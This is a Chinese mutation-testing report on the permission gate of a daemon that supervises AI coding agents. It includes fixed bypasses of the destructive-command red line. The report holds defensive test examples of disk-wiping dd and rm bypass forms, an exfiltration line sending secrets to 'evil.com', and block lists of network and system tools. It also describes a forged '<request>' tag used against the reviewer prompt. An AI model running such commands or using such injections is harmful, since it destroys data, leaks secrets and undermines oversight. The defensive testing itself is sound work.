# 变异测试基线(2026-10)

第一次量「测试到底护住了什么」。工具、怎么跑、什么时候跑见 [verify.md「变异测试」](verify.md#变异测试定期传感器不进-verify--每个-pr-的-ci);配置在 `stryker.config.mjs` / `stryker.db.config.mjs`。

一句话结论:**权限判定这一层(authorize / 档位 / 编译策略)护得很好;红线(floor)、放行规则文件(rules-file)、记忆收回(corrections)、迁移 runner 的外围护得一般;执行者闸门 / 路由 / 集成这一层的测试能杀的都是同目录单测已经杀了的,几乎没有「只有它能杀」的。**

## 怎么量的

- StrykerJS 10 + vitest runner,跑在 Node 24 上(`vitest.node.config.ts`),`coverageAnalysis: perTest`,`vitest.related`。
- 主配置 12 个文件、2448 个变异,牵连 4154 条测试;迁移 runner `src/lib/db.ts` 91 个变异,只用库层测试(`vitest.mutation-db.config.ts`,320 条)。
- 基于 `origin/dev` b6cf8c49。下表「基线」是没动任何测试时的数;本 PR 补的两处另列。

读数的三个前提:

1. **分数 = 被杀 + 超时 / 全部有效变异**(NoCoverage = 没有任何测试跑到这一行,也算没护住)。
2. **活变异不全是测试的错**:有一部分是等价变异(改了行为也不变,比如「这条分支前面已经 return 了」),下面逐条解读时会标出来。
3. **「谁杀的」只记第一个杀死它的测试**(默认 bail:一红就停)。「某个测试文件杀了几个」因此偏向先跑到的那些文件;「覆盖了很多、一个没杀」是强信号但不是证明 —— 下面「测试文件」一节用不 bail 的一次补跑校对过 authorize / chat。

## 分数

| 文件 | 变异 | 杀 | 活 | 没覆盖 | 分数 |
|---|---:|---:|---:|---:|---:|
| `src/domain/user-tier.ts` | 535 | 512 | 23 | 0 | 95.7 |
| `src/domain/authorize.ts` | 198 | 185 | 12 | 1 | **93.4** → 95.5(本 PR) |
| `src/adapters/permission-rules/paths.ts` | 41 | 39 | 2 | 0 | 95.1 |
| `src/domain/policy.ts` | 168 | 152 | 12 | 4 | 90.5 |
| `src/domain/memory/render.ts` | 109 | 96 | 13 | 0 | 88.1 |
| `src/adapters/permission-rules/chat.ts` | 116 | 93 | 21 | 2 | 80.2 |
| `src/adapters/permission-rules/decide.ts` | 203 | 158 | 41 | 4 | 77.8 |
| `src/adapters/permission-rules/rules-file.ts` | 449 | 342 | 95 | 12 | 76.2 |
| `src/domain/memory/facts.ts` | 44 | 33 | 10 | 1 | 75.0 |
| `src/domain/memory/corrections.ts` | 158 | 116 | 35 | 7 | 73.4 |
| `src/adapters/permission-rules/floor.ts` | 406 | 281 | 120 | 5 | **69.2** → 72.4(本 PR,410 个) |
| `src/domain/tool-decision.ts` | 17 | 9 | 2 | 6 | 52.9 |
| `src/lib/db.ts`(库层测试) | 91 | 50 | 36 | 5 | 54.9 |
| **合计(主配置)** | 2448 | 2062 | 397 | 39 | 81.6 → 82.6 |

耗时:主配置在空闲机器、4 个 worker 上约 15 分钟,首轮(不变异)约 4 分钟;迁移 runner 那份 3 分钟。增量重跑(只改了几个文件)几分钟。**别把 `src/lib/db.ts` 放回主配置**:几乎每个开库的测试都牵连它,它的模块级常量每变一处都得把 5000 多条测试全跑一遍,这次放在主配置里跑了一个半小时还剩 36 个没测完。

## 要紧的活变异(按文件)

只列改了会出事的;纯文案(提示词、日志、错误理由里的中文)被清空没测试红的不列,数量在上表里。

### `src/domain/authorize.ts`

- ~~定时任务读文件的三种拒(`job_pathless` / `job_outside` / `job_red_line`):把 `'deny'` 换成空串没有测试红~~ —— 测试只断言了 `reason`。今天的调用方(`src/daemon/bootstrap/wire-model-options.ts` 的 `profileGate`)按 `reason` 分支,所以没出事;但「红线 ⇒ 拒」这条契约没被钉住,换个按 `verdict` 判的调用方就漏了。**本 PR 已补**(见下)。
- L181 对话面:规则裁决 `(allow || deny) && by === 'rule'` 里前半截换成 `true` 不红。后果:openai(问不了)在主人对话里,规则说「问」⇒ 变成 `ask/owner_rules`,本该是 `deny/relay_unavailable`。没有「openai + 主人对话 + 规则说 ask」的用例。
- L194 `descriptor.kind === 'fs_read'` 换成 `true` 不红:readScope 对别的类别也生效。调用方只给 fs_read 传 readScope,今天等价。
- 其余(`ownerRulesApply` 的 surface 判断、`gateRelay` 返回 `'ask'` 换空串、`askUser ?? 'never'`)是等价变异。

### `src/domain/user-tier.ts`(工具分类)

95.7,整体护得好。活着的里面要紧的一条:**L297 `sub === 'cc_letter'` 换成 `false` 不红** —— 没被归成 `config_admin` 的 wechat 工具会落到末尾的默认 `fs_read`,信任档就能写信 / 改「不定期的信」开关(本该 admin-only)。`attach_file`(落 fs_read)、两条表情工具(落 reply)、`view_image` 同理没有分类用例,不过它们掉到默认类别时恰好同档或更严。`Task ⇒ subagent` 那几条是等价变异(未知工具默认就是 subagent)。

### `src/adapters/permission-rules/floor.ts`(红线)

红线是「宁可错杀」的一道,这一份最该补。

- ~~按词判的 rm / dd(`segs.some(s => s[0] === 'rm' || …)`)整段换成 `false` 不红~~ —— 所有用例都先被 `isDestructiveBash` 的正则接住了,按词判的那半截(专门防 `/bin/rm`、`\rm`、`"rm"`、`xargs rm` 这类绕过)从来没被单独测过。补测试时还发现**一个真漏洞**:`/bin/dd if=/dev/zero of=/dev/disk2` 不算红线 —— `commandSegments` 给每个带 `/` 的词取 basename,`of=/dev/disk2` 变成了 `disk2`,`/^(?:if|of)=/` 认不出。**本 PR 已修已补**(见下)。
- 词表大多只测了一两个:`SYSTEM_WORDS` 里的 `su` / `systemctl` / `crontab` / `chown` / `mkfs` / `diskutil` / `shred`,`NET_WORDS` 里的 `nc` / `scp` / `rsync` / `telnet` / `ftp`,`publishes` 里的 `git branch -D` / `filter-branch` / `update-ref -d`、`pnpm` / `yarn` / `cargo publish`、`gh release` / `gh repo delete`、`wechat-cc self change` —— 从表里删掉任何一个都不红。
- `after(seg, head, …tails)` 里 `every` 换成 `some` 不红:多词的尾巴(`reset --hard`、`pr merge`)只要出现一个词就算命中,目前只会多拦,但说明多词匹配没被测。
- `outbound`:curl / wget 目标判断里 `seg.slice(i + 1)` 换成 `seg`、`&&` 换 `||`、`LOCAL_TARGET` 去掉锚点都不红 —— `curl localhost.evil.com`、`curl -o x 127.0.0.1.evil.com` 这类没有用例。
- 密钥正则(`SECRETS`)的行首 / 边界分支、`.git/` 内部的行首分支、`security` 后的 `\s+` 换 `\s` 不红。
- 「项目目录就是家目录 / 根目录 ⇒ 不给项目内待遇」的正则 `/^(?:[a-z]:)?\/?$/` 三处变异不红(只测了家目录,没测 `/` 和 `C:\`)。
- 写到 `.git/` 里:`paths.some` 换 `paths.every` 不红(多路径里只有一条进 `.git/` 的情况没测)。
- `isLowRisk`:`RISKY_FLAGS` 的行首分支、`words.slice(1)` 换 `words`、绝对路径 / `..` 两个正则的字符类各有变异不红 —— 低风险是「宁可漏」那一道,影响是初审可能多放。

### `src/adapters/permission-rules/rules-file.ts`(放行规则文件)

- **L140 / L141 规则的 `surface` / `provider` 限定换成 `false` 不红**:一条只写了 `surface: 'terminal'` 的 allow 规则,在一起做 / 对话里也会生效;`provider` 同理。这是放宽权限的方向,优先补。
- L159 对话面路径限定规则「路径不全是绝对路径就不算命中」换成 `false` 不红。
- `unsafePattern`(防主人写出灾难性回溯的正则):嵌套分组那条整行换成 `false`、无界量词计数里 `+` / `{n,}` 两个分支、`quants.length > 4` 的边界都不红。第一道循环兜住了一部分,但第二道和计数没有单独用例。
- 解析:「不是对象」「`rules` 不是数组」「`starter` 必须是正整数」「`when` 必须是对象」「值必须是非空字符串」「`surface` 只认 terminal / workbench」这几条校验各有变异不红 —— 坏文件会被当成好文件读进来。

### `src/adapters/permission-rules/decide.ts`

- L95 `defuse`:`/<\/?request\b/gi` 换成 `/<\/request\b/gi` 不红 —— 只防了 `</request>`,请求里夹一个 `<request>` 开标签不会被拆。初审提示词注入的那道防线只测了一半。
- L83 `clearTimeout(timer)` 删掉不红(初审回得快时定时器留着,只是泄漏,不影响结论)。
- 其余活变异集中在 `reviewPrompt` 的文案(30 多个),提示词结构没有快照。

### `src/adapters/permission-rules/chat.ts`

- L119 `rules.decide` 抛错时 `return noRule()` 删掉不红:「规则层出事 ⇒ 落回问」没有用例。
- L111 / L115 `beforeAllow` 只认 `by === 'rule'`、提醒登记不上就不放:这两道是 permission-gate 之外的第二道保险,各自没被单独钉住(permission-gate 那道有测试)。
- L141 `authorizeChatToolUse` 把 `replyFamily` / `askUser` 透传给 authorize:去掉不红。Claude 的扇出 reply 在 `src/adapters/executors/claude/permission-relay.ts` 里更早就拒了,所以今天等价。

### `src/domain/policy.ts` / `src/domain/tool-decision.ts`

- `isExecutorOwnKind` 整个函数体换成空 / 条件换 `false` 不红 —— enforcement-matrix 靠它分「wechat MCP 按档注册」和「执行者自己的」,却没有测试在乎它的返回值。
- Codex strict 模式下「什么都不拒、什么都不问 ⇒ danger-full-access」那条(L142)换成 `false` 不红,分支本身也没覆盖到。
- `decideTool` 最后一行(档位没提到这个类别 ⇒ 看能力表 askUser)**完全没覆盖**:三个档位把所有类别都写全了,今天走不到。要么删,要么补一个「新类别没进档位」的用例。

### 记忆:`src/domain/memory/corrections.ts` / `render.ts` / `facts.ts`

- `markWrittenBack`(写回的旧话 ⇒ 收回):只看 `m:` / `u:` 开头、只看 `active`、够 `MIN_RETRACTED_CHARS` 长 —— 这三道各自换掉都不红。后果是短句会误伤、非 active 的行会被改状态。
- `tombstonesFromCorrections`:BOM 剥离、`ENTRY` / `LABEL_ID` 正则的锚点、第一条之前的非空行 ⇒ 不搬(返回 null)、说明行拼接都有变异不红。
- `renderCorrectionsMd` 按 `ord` 排序整段删掉不红(夹具恰好已经按顺序)。
- `render.ts` L73 `clean`(写 owner.md 前把原话里的 `<!--` / `-->` 拆掉、折叠空白):任何一环清空都不红 —— 原话里带 `-->` 会提前合上那一行的尾注(`o:<id> · 时间 · 来源`),读回来编号就丢了。
- `facts.ts` 的 `ord` / 编号自增方向反过来不红。

### `src/lib/db.ts`(迁移 runner)

`runMigrations` 主循环(从 user_version 往后逐个跑、每跑一个在同一事务里写 `user_version = i + 1`)的变异**全被杀**,这是最要紧的一块,护住了。活着的:

- **`PRAGMA foreign_keys = ON` 删掉不红** —— 没有任何库层测试依赖外键约束 / 级联删除。
- `PRAGMA busy_timeout = 5000` 删掉不红(难测,可以接受)。
- #79 修复的两道签名(`customer_reviews` 在、`social_echo` 不在)各自换成 `false` 不红:「真 1.3.2 库不许动」那条用例两道同时满足,单独去掉哪一道都还有另一道兜着。`current <= FORK_POINT` 的边界也没钉。
- `withLockRetry` 两次重试之间的 `sleep` 删掉 / 次数边界改了不红(测试只看最终结果)。
- `openDb` 建目录(`mkdirSync` 的 `recursive` / `mode: 0o700`)不红 —— 状态目录权限 0700 没有断言。
- `renameMigrated` 只吞 ENOENT:换成「吞一切错误」不红(EACCES 应该往上抛)。

## 本 PR 补的两处(红 → 绿)

1. `src/domain/authorize.test.ts`「定时任务」:三种读文件拒绝补上 `verdict: 'deny'`,另加一条范围干净 ⇒ `allow/job_allowed`。基线里 L195–L199 的 4 个 StringLiteral 变异活着,补完全死(authorize 93.4 → 95.5)。
2. `src/adapters/permission-rules/floor.test.ts`「终审绕过」:正则接不住、只能靠按词判的 rm / dd 写法(`/bin/rm -rf`、`\rm`、`"rm"`、`'rm'`、`xargs rm`、`/bin/dd if=… of=/dev/…`、`\dd of=…`)。先红在 `/bin/dd if=/dev/zero of=/dev/disk2`(真漏洞),修 `commandSegments`(带 `=` 的词不取 basename)后转绿;基线里那一行 23 个变异有 16 个活 / 没覆盖,补完剩 4 个:2 个等价(`s[0] === 'rm'` 被 `s.includes('rm')` 覆盖)、2 个只会多拦(`dd` 与 `of=` 换成「或」、`of=` 的正则去掉行首锚点)。

## 测试文件:谁在干活,谁几乎不杀

「杀」= 第一个杀死该变异的测试所在文件;「覆盖」= 跑到过被变异那一行。

**干活的**(同目录的纯函数单测,用例是一张张输入 → 输出表):

| 测试文件 | 杀 | 覆盖 |
|---|---:|---:|
| `src/domain/user-tier.test.ts` | 396 | 440 |
| `src/adapters/permission-rules/floor.test.ts` | 207 | 349 |
| `src/daemon/chat-owner-rules.test.ts` | 163 | 1026 |
| `src/adapters/permission-rules/decide.test.ts` | 155 | 543 |
| `src/adapters/permission-rules/rules-file.test.ts` | 155 | 389 |
| `src/features/memory/memory-export.test.ts` | 152 | 266 |
| `src/daemon/permission-gate.test.ts` | 130 | 724 |
| `src/domain/authorize.parity.test.ts` | 123 | 776 |
| `src/domain/policy.test.ts` | 93 | 114 |
| `src/domain/authorize.test.ts` | 65 | 207 |
| `src/lib/db.test.ts`(db 那份) | 45 | 86 |

`chat-owner-rules` / `permission-gate` 不是纯单测,但它们用的是真的 decide / floor / authorize、断言的是最终裁决,所以也在杀。`memory-export` 是逐字节的导出金样,一份夹具杀了 150 个记忆渲染 / 收回的变异。

**覆盖很多、第一个杀死的几乎轮不到它的**(264 个跑到过目标代码的测试文件里,221 个一次「第一个杀死」都没拿到):

| 测试文件 | 覆盖 | 第一个杀 |
|---|---:|---:|
| `src/adapters/executors/claude/permission-relay.test.ts` | 418 | 1 |
| `src/domain/enforcement-matrix.proof.test.ts` | 387 | 0 |
| `src/daemon/bootstrap/openai-plugin-stall.test.ts` | 337 | 1 |
| `src/features/phone/tunnel-client.test.ts` | 311 | 0 |
| `src/adapters/executors/openai/openai-gate.test.ts` | 198 | 0 |
| `src/daemon/mode-commands.test.ts` | 176 | 0 |
| `src/daemon/internal-api/routes-daemon-control.test.ts` | 165 | 0 |
| `src/adapters/store/memory-facts.test.ts` | 156 | 2 |
| `src/mcp-servers/wechat/integration.test.ts` | 132 | 1 |
| `src/features/memory/retract.test.ts` | 127 | 0 |
| `src/features/memory/memory-golden.test.ts` | 98 | 0 |

库层那份里,`src/lib/state-migration.test.ts` / `threads-store.test.ts` / `messages-store.test.ts` 各覆盖 db.ts 46–49 个变异,一个没先杀到。

**这张表有偏差,用不 bail 的补跑校对过**:对 `src/domain/authorize.ts` + `src/adapters/permission-rules/chat.ts`(314 个变异,32 分钟)关掉 bail,每个变异把覆盖它的测试全跑完,记下「谁能杀」和「只有谁能杀」(唯一杀):

| 测试文件 | 唯一杀 | 能杀 | 覆盖 |
|---|---:|---:|---:|
| `src/domain/authorize.test.ts` | 22 | 162 | 175 |
| `src/adapters/permission-rules/chat.test.ts` | 15 | 141 | 206 |
| `src/domain/authorize.parity.test.ts` | 14 | 182 | 233 |
| `src/daemon/chat-owner-rules.test.ts` | 3 | 130 | 205 |
| `src/adapters/executors/codex/codex-chat-gate.test.ts` | 0 | 117 | 194 |
| `src/adapters/executors/claude/permission-relay.test.ts` | 0 | 44 | 107 |
| `src/adapters/executors/openai/openai-gate.test.ts` | 0 | 39 | 98 |
| `src/domain/enforcement-matrix.proof.test.ts` | 0 | 34 | 88 |
| `src/daemon/mode-commands.test.ts` | 0 | 8 | 89 |
| `src/daemon/internal-api/routes-daemon-control.test.ts` | 0 | 7 | 87 |
| `src/features/workbench/*`、`src/features/phone/*` 十个集成测试 | 0 | 0 | 各 28 |

所以准确的说法是:**执行者闸门 / 路由 / 集成这一层的测试并非不杀,而是杀的全是同目录单测已经杀了的**(38 个覆盖到这两份文件的测试文件里,只有 4 个唯一杀过东西,15 个一个都杀不了)。它们护的是「这一层把 authorize 接上了」,不护判定本身;判定本身全靠 `authorize.test` / `authorize.parity.test` / `chat.test` 这三份。

## 怎么用这份基线

- **补测试的优先级**:rules-file 的 surface / provider 限定、user-tier 的 `cc_letter` 分类(都是放宽权限的方向)> floor 的词表与 outbound > `PRAGMA foreign_keys` > corrections 的 `markWrittenBack` 三道 > render 的注释拆除 > decide 的 `<request>` 开标签。每补一处照「红 → 绿」:先在 `reports/mutation/index.html` 里确认那个变异活着,补完重跑看它死。
- **删测试之前**:上面「唯一杀 0」的文件,不等于该删 —— 它们可能在测别的东西(路由、协议、生命周期),只是对判定逻辑没有独有的贡献。删之前先看它断言的是什么;如果断言的是「这一层被调到了」而判定本身靠 mock 或者靠别处,就是可以换成上面那种输入 → 输出表的候选。
- **下次跑**:发版前或这几个文件大改之后。分数掉了先看是不是 Timeout 变多(机器忙),再看活变异的 diff。

## 2026-10-27 补缺口(基线「要紧的活变异」逐条)

按上面「补测试的优先级」把六处补成输入 → 裁决的表(测试放在被测代码旁边),每处先在 Stryker 里确认变异活着、补完重跑确认死了。
只跑了这几份文件(`--mutate`,2 个 worker,nice),所以下表「之前」取上面基线的数(全量配置、干净的一次);「之后」是补完重跑的数。

| 文件 | 之前 | 之后 | 说明 |
|---|---:|---:|---|
| `src/domain/user-tier.ts` | 95.7 | 97.2 | wechat 工具 × 三档的最终裁决表 |
| `src/adapters/permission-rules/floor.ts` | 72.4(410 个) | 83.8(421 个) | 词表逐词 + outbound;顺手修了一个漏洞(见下),变异数因此变了 |
| `src/adapters/permission-rules/rules-file.ts` | 76.2 | 78.4 | surface / provider 单独限定;对话里的相对路径 |
| `src/adapters/permission-rules/decide.ts` | 77.8 | 79.3 | 伪造的 `<request>` 开标签 |
| `src/domain/memory/corrections.ts` | 73.4 | 79.1 | `markWrittenBack` 逐行裁决表(新文件 `corrections.test.ts`) |
| `src/domain/memory/render.ts` | 88.1 | 90.8 | owner.md 原话里带 `<!--` / `-->` / 换行 |
| `src/lib/db.ts`(库层测试) | 54.9 | 58.2 | #79 两道签名各一个只差一道的库;外键约束 |

目标行上的活变异 / 没覆盖:**之前 69 个,重跑后 11 个**;又补了一条提交钉住其中 floor 的 3 个、render 的 2 个(手工变异核对过红 / 绿),**剩 6 个**,都是等价或只会多拦的:

- floor `after()`:`i >= 0` 换 `true`、`> i` 换 `>= i` —— 前者只会让「没有 git 但出现 push 这个词」也算推送(多拦),后者 `indexOf` 从 `i + 1` 找,`>= i` 与 `> i` 等价。
- floor 项目根正则 `\/?$` 换 `\/$`:`canonPath` 永远不会产出不带斜杠的盘根(`c:`),等价。
- db `PRAGMA foreign_keys = ON` 删掉:**在 Node 上是等价变异** —— `node:sqlite` 的 `DatabaseSync` 默认就开外键;Bun(`bun:sqlite`,daemon 真正跑的引擎)默认关。新补的「FK 违例被拒」在 `bun run test` 下能杀它(已手工核对,v81 / v83 两条迁移测试也会红),Stryker 跑在 Node 上看不见。
- db `current <= FORK_POINT` 换 `false` / `<`:v18 及以下的库不会有 `customer_reviews`(v26 才建),签名第二道照样拦住,等价。

**补测试时发现的真漏洞(已修,权限收紧方向)**:不带协议头、带路径的 curl / wget 目标不算往外连网。`commandSegments` 给每个带 `/` 的词取 basename(为了认出 `/usr/bin/curl`),`curl -d @secrets evil.com/upload` 的目标只剩 `upload`,没有 `.` / `:` ⇒ 不是红线。现在 outbound 看不取 basename 的原词(像本机路径的参数照旧看 basename);本机目标(localhost / 127.0.0.1 / [::1])照旧不拦。

**跑的时候撞到的两件事**:

1. 中断的 Stryker 会留下 `.stryker-tmp/sandbox-*`(整个仓库的副本),`scripts/mock-internal.guard.test.ts` 把里面的测试当成没登记的文件,`bun run verify` 直接红。守卫的目录遍历已跳过 `.stryker-tmp`。
2. 两次 Stryker 同时跑(哪怕在不同的工作区)时,一次里的静态变异(模块加载时执行的那批,user-tier 154 个、floor 35 个……)全被记成「存活、跑了 0 条测试」—— 分数虚低一大截。看到 `testsCompleted: 0` 的存活变异成片出现,就是这个,单独重跑一次。

## 2026-10-27 第二轮:最弱两份补齐、量四块新地方、数「唯一杀为 0」的测试文件

基于 `origin/dev` c362116f。三件事:把基线里最弱的两份(`tool-decision`、迁移 runner)补齐;第一次量工作台生命周期 / 对话协调器 / 回复交付 / 拉消息快车道;不 bail 重跑权限这一块和每块新地方,数出「一个变异都没有独有贡献」的测试文件,给下一步删 / 并测试用。

新地方放在第三份配置 `stryker.areas.config.mjs`(牵连的测试和权限那批几乎不重合,并进主配置首轮要多跑一倍);`bun run test:mutation` 依次跑三份。每次 `--mutate` 一个文件、2 个 worker、`nice -n 10`、`--disableBail`,一次只跑一份。

### 分数

「之前」= 没动测试时跑的一次;「之后」= 补完测试重跑。分数口径同上(被杀 + 超时 / 有效变异)。

| 文件 | 变异 | 之前 | 之后 | 说明 |
|---|---:|---:|---:|---|
| `src/domain/tool-decision.ts` | 17 | 52.9 | **94.1** | 基线最弱的一份 |
| `src/lib/db.ts`(库层测试) | 91 | 58.2 | **83.5** | 基线第二弱 |
| `src/app/coordinator/plan.ts` | 208 | 71.6 | **95.2** | 新量:协调器一轮的计划 |
| `src/domain/turn-reply.ts` | 248 | 75.8 | **93.5** | 新量:取最后的话 / NO_REPLY |
| `src/daemon/reply-delivery.ts` | 463 | 67.8 | **81.0** | 新量:发什么、去重、回落 |
| `src/daemon/poll-loop.ts` | 432 | 49.7 | **83.1** | 新量:解析 + 快车道(超时 68 个,大多是循环变异真卡住) |
| `src/daemon/permission-answer.ts` | 12 | 91.7 | **100** | 新量:快车道消费拍板回答 |
| `src/features/workbench/service/admission.ts` | 121 | 92.6 | **98.3** | 新量:准入与续接 |
| `src/features/workbench/service/inputs.ts` | 263 | 75.7 | **87.1** | 新量:补充 |
| `src/features/workbench/service/lifecycle.ts` | 638 | — | 测量中 | 新量:租约 / 收工 / 派发泵 / 取消(见下「跑的时候撞到的」第 3 条) |

### 补了什么(全是输入 → 结果的行为用例,放在被测代码旁边;没删测试、没改被测代码)

- **`tool-decision`**:档位三张表都没提到的类别 ⇒ 看能力表 askUser(`decideTool` 最后一行,基线里完全没覆盖)。剩 1 个等价(askUser 缺省 `'never'` 换空串)。
- **迁移 runner**:重试之间按 `delayMs` 等、最后一次失败后不等;父目录不在 ⇒ 逐级建、权限 0700;`openWechatDb` 落在 `<stateDir>/wechat-cc.db`;`busy_timeout` 5 秒;`renameMigrated` 非 ENOENT 的错往上抛;#79 修复只认主库那份迁移表。剩下 15 个是日志文案和等价变异(Node 的 `node:sqlite` 默认开外键、`openSqlite` 默认就建库、`FORK_POINT` 边界)。
- **协调器 `plan.ts`**(新文件 `plan.test.ts`):`admit` 的档位 / 单模型回落 / 一组的筛选(没注册、agy、按原始档位被拒)/ 封顶 3 家 / 一个不剩退成单模型;`planTurn` 的老数据回填、写库失败照跑、守护挡下后的定形与回话、quiet 不回话不记日志、按这一轮实际目标判。**以前整份只经五家交付的集成测试间接跑到,筛参与者整条换成 `true` 都不红**。
- **`turn-reply`**:段边界(非 text 事件带字也不进段、`replace` 只认本段见过的 itemId、`ownSegment` 自成一段)、NO_REPLY 令牌边界(`NO_REPLYING` 不算、句中的令牌原样留着、`NO_REPLY，好的` 只剥令牌、中间一行令牌)、all_segments 的静默与附件。
- **`reply-delivery`**:与 message 工具去重(只差标点 / 互相包含 ⇒ 去重;说过的只有标点 ⇒ 不算说过)、app 接收器的交付分类、条间节奏、非语音附件失败不改发字、提醒那条发失败记账、/both 里提醒只跟第一位交付的走、撤销登记、两位共用一轮的收口。
- **`poll-loop`**:语音(转写 / 媒体)/ 文件 / 视频三类解析 **基线里一条都没跑到**、消息 id 的来源、过期 ⇒ loop 自己停、单账号停 / 加、快车道吃掉回答当场盖心跳、失败日志折叠(前 3 次逐条、之后每 20 次)、僵尸长轮询第 5 次报、之后每 20 次再报。
- **`permission-answer`**:没有文字(图片 / 语音)的消息按空串问,不编一句。
- **工作台 `admission`**:执行者已不在登记表 ⇒ 不能续(不往外抛);导入了还没发第一句、原会话的 cwd 换了写法 ⇒ 不续原会话;只有系统事件 ⇒ new;导入后没确认关掉外部会话 / 停机中 ⇒ 拒。
- **工作台 `inputs`**:回执只认 8 位小写十六进制 id + 本人本任务(别的任务的回执给 null);排空时文件夹身份变了 ⇒ hold 成 `invalid_path`、不投;同 id 重发换了 runId 算冲突;投递中不叠;守护放行 / 拒;10 条上限;steer 那条路三种结局;runtime 路径变了 ⇒ held 并重新武装收工计时。
- **工作台 `lifecycle`**:派发泵里「起不来」(launch 失败)那一支 **整段没覆盖**:收提问和权限卡(cancelled / ended)、撤凭据、还文件夹;起过会话的挂成「没确认退出」继续占着;已经公开收尾的不动。取消归档后 matter 回到哪一态。这一份的 Stryker 是在补完测试后才量完的(见下面「跑的时候撞到的」第 3 条),所以只有「之后」;另外手工改坏四处(launch 失败分支的 `markUncertain` / 收卡 / `publicFinished` 判断、归档撤销的 `interrupted ⇒ open`)各自有用例红,改回绿。

没发现真漏洞:这一轮补的用例在当前代码上第一次跑就全绿,活变异都是「没人钉住」,不是「行为错了」。

### 还活着、值得记一笔的

只列改了会出事、而这一轮没补的;日志文案、`?.` 换 `.`(对象一定在)、「前面已经 return 了」这类等价的不列。

- `inputs` L109 `assertNotRewindBlocked(...)` 整行删掉不红:「回退停住的事不收补充」在 inputs 域的单测里没有用例(工作台服务那层的 `service-rewind.test.ts` 有,但它覆盖到的那几个变异都被别的先杀了 / 只覆盖不杀)。下一轮补。
- `inputs` L184–L186 投递成功 / 没确认后的 `hub.bumped` / `touched` 删掉不红 —— 「详情可能变了」的推送没人断言,手机 / 桌面会晚一拍看到状态变。
- `poll-loop` L469 快车道模式下「停下了 ⇒ 这一批剩下的不处理」、L396「跳过过一条 ⇒ 之后的游标不落盘」:后者换成 `false` 不红 —— 停机时跳过的消息之后的游标若照样落盘,重启就不会重放那几条。`stop()` 那条用例只断言了「没处理」,没断言游标停在哪。
- `reply-delivery` L245 / L350:`turnChatFor` 的「这家没有在跑的轮」两道判断互相兜着,单独去掉哪一道都不红(等价对)。
- `turn-reply` 剩下的 16 个全是等价:空段被 `nonEmpty` 过滤、`itemIndex.set(undefined)` 永远查不到、`TOKEN_LINE` 已经先接住整段令牌。
- `plan.ts` 剩下 10 个:`primary_tool` 两条的 `logs: []`、守护那句日志的结构化字段、`registry.get` 为空时传不传模型 —— 不影响计划本身。
- `db.ts` 剩下 15 个同上一节:日志文案、Node 上的外键默认值、`openSqlite` 默认建库、`FORK_POINT` 边界。

- `lifecycle`:Stryker 还在跑(不 bail 约五小时),跑完补这一条。

### 唯一杀为 0 的测试文件

「唯一杀」= 一个被杀的变异,杀死它的测试全在同一个测试文件里;只列跑到过目标代码(覆盖 > 0)的文件,被 `vitest --related` 牵连进来但一行目标代码都没跑到的只报个数。这是删 / 并测试的**候选**,不是结论:删之前看它断言的是什么(路由、协议、生命周期这些可能不在这几份被变异的文件里)。

复现:

```bash
# 一次一个文件、不 bail,增量文件本身就是一份完整报告(带 killedBy / coveredBy / testFiles)
node tools/mutation/node_modules/@stryker-mutator/core/bin/stryker.js run stryker.config.mjs \
  --mutate src/domain/authorize.ts --concurrency 2 --disableBail --incrementalFile reports/mutation/inc/perm-authorize.json
# …每个文件一份,然后按块合起来数(测试 id 每份报告各自编,脚本按报告分别换成测试文件再合计)
bun tools/mutation/unique-kills.ts reports/mutation/inc/perm-*.json
```

#### 权限这一块(authorize + permission-rules 五份)

还在跑(`--disableBail`,一次一个文件),跑完补。

#### 协调器(plan.ts)

```
bun tools/mutation/unique-kills.ts reports/mutation/inc/plan-after.json 
```

唯一杀为 0、但跑到过目标代码的测试文件(12 个;另有 46 个被牵连进来、一行目标代码都没跑到,不列):
- src/app/conversation-coordinator.reply-delivery.test.ts(能杀 51,覆盖 105)
- src/features/reminders/reminders.e2e.test.ts(能杀 28,覆盖 81)
- src/adapters/executors/claude/claude-api-error.test.ts(能杀 17,覆盖 52)
- src/app/conversation-coordinator.agy-delivery.test.ts(能杀 17,覆盖 52)
- src/app/conversation-coordinator.claude-delivery.test.ts(能杀 17,覆盖 52)
- src/app/conversation-coordinator.codex-delivery.test.ts(能杀 17,覆盖 52)
- src/app/conversation-coordinator.cursor-delivery.test.ts(能杀 17,覆盖 52)
- src/app/conversation-coordinator.gemini-delivery.test.ts(能杀 17,覆盖 52)
- src/daemon/bootstrap.a2a.test.ts(能杀 0,覆盖 2)
- src/daemon/bootstrap.test.ts(能杀 0,覆盖 2)
- src/daemon/bootstrap/boot-order.test.ts(能杀 0,覆盖 2)
- src/daemon/bootstrap/wire-coordinator.test.ts(能杀 0,覆盖 2)

#### 回复交付(turn-reply + reply-delivery)

```
bun tools/mutation/unique-kills.ts reports/mutation/inc/turnreply-after2.json reports/mutation/inc/rd-after.json 
```

唯一杀为 0、但跑到过目标代码的测试文件(17 个;另有 97 个被牵连进来、一行目标代码都没跑到,不列):
- src/app/conversation-coordinator.cursor-delivery.test.ts(能杀 161,覆盖 379)
- src/features/reminders/reminders.e2e.test.ts(能杀 77,覆盖 296)
- src/app/conversation-coordinator.reply-delivery.test.ts(能杀 52,覆盖 161)
- src/adapters/executors/openai/openai-agent-provider.test.ts(能杀 29,覆盖 63)
- src/adapters/executors/claude/claude-api-error.test.ts(能杀 16,覆盖 104)
- src/daemon/selftest.test.ts(能杀 8,覆盖 67)
- src/adapters/executors/gemini/gemini-agent-provider.test.ts(能杀 8,覆盖 66)
- src/adapters/executors/openai-integration.test.ts(能杀 8,覆盖 63)
- src/daemon/bootstrap/openai-plugin-stall.test.ts(能杀 8,覆盖 63)
- src/daemon/bootstrap/delegate.test.ts(能杀 8,覆盖 60)
- src/features/phone/tunnel-client.test.ts(能杀 0,覆盖 26)
- src/domain/capability-matrix.test.ts(能杀 0,覆盖 24)
- src/daemon/guard/effective-target.test.ts(能杀 0,覆盖 6)
- src/daemon/bootstrap.a2a.test.ts(能杀 0,覆盖 3)
- src/daemon/bootstrap.test.ts(能杀 0,覆盖 3)
- src/daemon/bootstrap/boot-order.test.ts(能杀 0,覆盖 3)
- src/daemon/bootstrap/wire-coordinator.test.ts(能杀 0,覆盖 3)

#### 拉消息快车道(poll-loop + permission-answer)

```
bun tools/mutation/unique-kills.ts reports/mutation/inc/poll-after.json reports/mutation/inc/pa-after.json 
```

唯一杀为 0、但跑到过目标代码的测试文件(13 个;另有 2 个被牵连进来、一行目标代码都没跑到,不列):
- src/features/reminders/reminders.e2e.test.ts(能杀 5,覆盖 199)
- src/daemon/wiring/lifecycle-deps.test.ts(能杀 0,覆盖 1)
